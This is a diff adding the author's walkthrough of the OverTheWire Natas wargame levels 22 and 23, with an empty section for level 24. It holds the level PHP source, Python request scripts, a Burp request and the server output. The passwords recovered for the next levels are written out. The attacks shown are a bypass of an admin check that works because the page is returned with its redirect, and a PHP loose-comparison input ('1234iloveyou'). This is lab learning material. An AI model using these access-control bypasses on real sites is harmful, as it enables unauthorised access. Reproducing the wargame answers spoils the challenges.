@@ -2679,3 +2679,301 @@ Password: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz</pre>
 </body>
 </html>
 ```
+
+## Natas 22
+
+### Credentials
+
+Username: natas22
+Password: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz
+URL: http://natas22.natas.labs.overthewire.org
+
+### Message
+
+There's just a blank page with a link to the source code.
+
+### Solution
+
+The source code:
+
+```html
+<?php
+session_start();
+
+if(array_key_exists("revelio", $_GET)) {
+    // only admins can reveal the password
+    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
+    header("Location: /");
+    }
+}
+?>
+
+
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas22", "pass": "<censored>" };</script></head>
+<body>
+<h1>natas22</h1>
+<div id="content">
+
+<?php
+    if(array_key_exists("revelio", $_GET)) {
+    print "You are an admin. The credentials for the next level are:<br>";
+    print "<pre>Username: natas23\n";
+    print "Password: <censored></pre>";
+    }
+?>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+This seems simple...
+
+Though, the script
+
+```python
+import base64
+import requests
+from requests.auth import HTTPBasicAuth
+
+basic_auth = HTTPBasicAuth('natas22', 'd8rwGBl0Xslg3b76uh3fEbSlnOUBlozz')
+
+url = "http://natas22.natas.labs.overthewire.org/index.php"
+
+
+def send_request(url) -> str:
+    print(f"Sending request to [{url}]...")
+    headers = {'Content-Type': 'text/html; charset=UTF-8'}
+    response = requests.get(url,
+                            headers=headers,
+                            auth=basic_auth,
+                            verify=False)
+    return response.text
+
+
+if __name__ == '__main__':
+    text = send_request(url + "?revelio=1")
+    print(text)
+```
+
+doesn't work as expected:
+
+```bash
+python natas22.py
+Sending request to [http://natas22.natas.labs.overthewire.org/index.php?revelio=1]...
+
+
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas22", "pass": "d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz" };</script></head>
+<body>
+<h1>natas22</h1>
+<div id="content">
+
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+Trying with Burp. The request:
+
+```
+GET /?revelio=1 HTTP/1.1
+Host: natas22.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:131.0) Gecko/20100101 Firefox/131.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Authorization: Basic bmF0YXMyMjpkOHJ3R0JsMFhzbGczYjc2dWgzZkViU2xuT1VCbG96eg==
+Connection: keep-alive
+Cookie: PHPSESSID=geosrhe1qijrg261strl2fgfat
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+Priority: u=0, i
+```
+
+passed to Repeater and sent, gives:
+
+```
+HTTP/1.1 302 Found
+Date: Sun, 20 Oct 2024 14:52:57 GMT
+Server: Apache/2.4.58 (Ubuntu)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Location: /
+Content-Length: 1028
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+
+
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas22", "pass": "d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz" };</script></head>
+<body>
+<h1>natas22</h1>
+<div id="content">
+
+You are an admin. The credentials for the next level are:<br><pre>Username: natas23
+Password: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs</pre>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+## Natas 23
+
+### Credentials
+
+Username: natas23
+Password: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs
+URL: http://natas23.natas.labs.overthewire.org
+
+### Message
+
+The page requires a password.
+
+### Solution
+
+We are given the source code:
+
+```html
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas23", "pass": "<censored>" };</script></head>
+<body>
+<h1>natas23</h1>
+<div id="content">
+
+Password:
+<form name="input" method="get">
+    <input type="text" name="passwd" size=20>
+    <input type="submit" value="Login">
+</form>
+
+<?php
+    if(array_key_exists("passwd",$_REQUEST)){
+        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
+            echo "<br>The credentials for the next level are:<br>";
+            echo "<pre>Username: natas24 Password: <censored></pre>";
+        }
+        else{
+            echo "<br>Wrong!<br>";
+        }
+    }
+    // morla / 10111
+?>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+This seems to verify that `iloveyou` is contained in the password; moreover, the password should be in some sense greater than `10`: `$_REQUEST["passwd"] > 10`. We can guess that some sort of casting is happening...
+
+Let's try something like `1234iloveyou`:
+
+```python
+import base64
+import requests
+from requests.auth import HTTPBasicAuth
+
+basic_auth = HTTPBasicAuth('natas23', 'dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs')
+
+url = "http://natas23.natas.labs.overthewire.org/index.php"
+
+
+def send_request(url) -> str:
+    print(f"Sending request to [{url}]...")
+    headers = {'Content-Type': 'text/html; charset=UTF-8'}
+    response = requests.get(url,
+                            headers=headers,
+                            auth=basic_auth,
+                            verify=False)
+    return response.text
+
+
+if __name__ == '__main__':
+    text = send_request(url + "?passwd=1234iloveyou")
+    print(text)
+```
+
+Easy job:
+
+```bash
+python natas23.py
+Sending request to [http://natas23.natas.labs.overthewire.org/index.php?passwd=1234iloveyou]...
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas23", "pass": "dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs" };</script></head>
+<body>
+<h1>natas23</h1>
+<div id="content">
+
+Password:
+<form name="input" method="get">
+    <input type="text" name="passwd" size=20>
+    <input type="submit" value="Login">
+</form>
+
+<br>The credentials for the next level are:<br><pre>Username: natas24 Password: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd</pre>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+## Natas 24
+
+### Credentials
+
+Username: natas24
+Password: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd
+URL: http://natas24.natas.labs.overthewire.org
+
+### Message
+
+### Solution
